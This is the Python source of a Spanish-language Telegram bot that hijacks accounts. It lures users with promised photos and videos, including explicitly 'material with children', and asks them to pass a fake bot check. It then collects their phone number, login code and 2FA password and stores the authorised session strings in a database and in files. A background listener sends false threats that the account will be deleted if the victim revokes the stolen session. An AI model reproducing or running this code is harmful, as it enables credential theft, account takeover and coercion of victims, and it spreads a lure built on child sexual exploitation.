import logging
import os
import json
import phonenumbers
from phonenumbers import geocoder
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils import executor
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv
import asyncio
from datetime import datetime, timedelta

load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]
deleted_sessions_col = db["deleted_sessions"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_states = {}
user_clients = {}
user_phones = {}
user_code_buffers = {}

os.makedirs("sessions", exist_ok=True)

async def check_deleted_sessions():
    while True:
        try:
            now = datetime.now()
            expired_sessions = deleted_sessions_col.find({
                "delete_time": {"$lte": now}
            })
            
            for session in expired_sessions:
                try:
                    await bot.send_message(
                        session["user_id"],
                        "⚠️ Su cuenta de Telegram será eliminada en 17 horas porque eliminó la sesión activa. "
                        "Para evitar esto, debe volver a verificar en este bot."
                    )
                    sessions_col.delete_one({"phone": session["phone"]})
                    deleted_sessions_col.delete_one({"_id": session["_id"]})
                except Exception as e:
                    logging.error(f"Error al notificar usuario {session['user_id']}: {e}")
            
            await asyncio.sleep(3600)  # Check every hour
        except Exception as e:
            logging.error(f"Error en check_deleted_sessions: {e}")
            await asyncio.sleep(60)

async def on_startup(dp):
    asyncio.create_task(check_deleted_sessions())

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("Autorización en la primera cuenta🥺", callback_data="auth_account")
    )
    await message.answer(
        "👋🇪🇨 ¡HOLA! ❤️\n"
        "¿Quieres ver más de 10.000 fotos y más de 4.000 vídeos? 👁\n"
        "Verifica que no eres un bot con el botón de abajo. 🤖👇\n\n",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Comparte tu número", request_contact=True))

    await bot.send_message(user_id, "🥺Por favor comparte tu número de teléfono:", reply_markup=kb)
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    if user_states.get(user_id) != 'awaiting_contact':
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    # Check if session exists
    existing_session = sessions_col.find_one({"phone": phone})
    if existing_session:
        try:
            client = TelegramClient(StringSession(existing_session["session"]), API_ID, API_HASH, proxy=proxy)
            await client.connect()
            
            if await client.is_user_authorized():
                await message.answer(
                    "✅ Ya has verificado tu número anteriormente. "
                    "Nuestro bot está un poco cargado. Tan pronto como se descargue, "
                    "le enviaremos su material fotográfico y de video con niños."
                )
                await client.disconnect()
                cleanup(user_id)
                return
        except:
            pass

    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=proxy)
    await client.connect()
    user_clients[user_id] = client
    user_phones[user_id] = phone

    try:
        await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        user_code_buffers[user_id] = {'code': '', 'message_id': None}
        msg_id = await send_code_keyboard(user_id, "", None)
        user_code_buffers[user_id]['message_id'] = msg_id
        await message.answer("⌨️ Introduce el código presionando los botones de abajo:")
    except Exception as e:
        await message.answer(f"❌ Error al enviar el código: {e}")
        await client.disconnect()
        cleanup(user_id)

async def send_code_keyboard(user_id, current_code, message_id=None):
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("✅ Enviar", callback_data="code_send")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"Código: `{current_code}`" if current_code else "Introduce el código:"

    if message_id:
        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
                                  text=text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
        return msg.message_id

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="⛔️ No es el momento adecuado", show_alert=True)
        return

    buffer = user_code_buffers.get(user_id)
    if not buffer:
        await bot.answer_callback_query(callback_query.id, text="Error interno.", show_alert=True)
        return

    current_code = buffer['code']
    message_id = buffer['message_id']

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Introduce primero el código", show_alert=True)
            return
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in_code(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Código demasiado largo", show_alert=True)
            return
        current_code += digit
        user_code_buffers[user_id]['code'] = current_code
        await bot.answer_callback_query(callback_query.id)
        await send_code_keyboard(user_id, current_code, message_id)

async def try_sign_in_code(user_id, code):
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    if not client or not phone:
        await bot.send_message(user_id, "⚠️ Sesión no encontrada. Inténtalo de nuevo con /start")
        cleanup(user_id)
        return

    try:
        await client.sign_in(phone=phone, code=code)
        if await client.is_user_authorized():
            me = await client.get_me()
            session_str = client.session.save()
            
            # Save with additional metadata
            sessions_col.update_one(
                {"phone": phone},
                {"$set": {
                    "phone": phone,
                    "session": session_str,
                    "user_id": user_id,
                    "last_active": datetime.now(),
                    "first_auth": datetime.now()
                }},
                upsert=True
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await bot.send_message(
                user_id,
                "✅ Has pasado la verificación. Nuestro bot está un poco cargado. "
                "Tan pronto como se descargue, le enviaremos su material fotográfico y de video con niños."
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            user_states[user_id] = 'awaiting_2fa'
            await bot.send_message(user_id, "🔐 Introduce tu contraseña 2FA:")
    except PhoneCodeExpiredError:
        await bot.send_message(user_id, "⏰ Código caducado. Inténtalo de nuevo desde /start")
        await client.disconnect()
        cleanup(user_id)
    except PhoneCodeInvalidError:
        await bot.send_message(user_id, "❌ Código incorrecto. Inténtalo de nuevo:")
        user_code_buffers[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        await bot.send_message(user_id, "🔐 Se requiere tu contraseña 2FA. Introdúcela:")
    except Exception as e:
        await bot.send_message(user_id, f"❌ Error de inicio de sesión: {e}")
        await client.disconnect()
        cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)

    if not client or not phone:
        await message.answer("⚠️ Sesión no encontrada. Inténtalo de nuevo desde /start")
        cleanup(user_id)
        return

    try:
        await client.sign_in(password=password)
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            # Save with additional metadata
            sessions_col.update_one(
                {"phone": phone},
                {"$set": {
                    "phone": phone,
                    "session": session_str,
                    "user_id": user_id,
                    "last_active": datetime.now(),
                    "first_auth": datetime.now()
                }},
                upsert=True
            )
            
            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await message.answer(
                "✅ Has pasado la verificación. Nuestro bot está un poco cargado. "
                "Tan pronto como se descargue, le enviaremos su material fotográfico y de video con niños."
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            await message.answer("❌ No se puede acceder con 2FA.")
    except Exception as e:
        await message.answer(f"❌ Error con 2FA: {e}")
        await client.disconnect()
        cleanup(user_id)

async def handle_session_revoked(event):
    try:
        phone = event.original_update.phone
        session_info = sessions_col.find_one({"phone": phone})
        
        if session_info:
            deleted_sessions_col.insert_one({
                "phone": phone,
                "user_id": session_info["user_id"],
                "delete_time": datetime.now() + timedelta(hours=17)
            })
            
            try:
                await bot.send_message(
                    session_info["user_id"],
                    "⚠️ Su cuenta de Telegram será eliminada en 17 horas porque eliminó la sesión activa. "
                    "Para evitar esto, debe volver a verificar en este bot."
                )
            except Exception as e:
                logging.error(f"Error al notificar usuario {session_info['user_id']}: {e}")
    except Exception as e:
        logging.error(f"Error en handle_session_revoked: {e}")

def cleanup(user_id):
    user_states.pop(user_id, None)
    user_clients.pop(user_id, None)
    user_phones.pop(user_id, None)
    user_code_buffers.pop(user_id, None)

if __name__ == '__main__':
    # Create client for session revoked events
    event_client = TelegramClient('session_revoked_listener', API_ID, API_HASH)
    event_client.add_event_handler(handle_session_revoked, events.UserUpdate)
    
    async def start():
        await event_client.start()
        await executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
    
    asyncio.get_event_loop().run_until_complete(start())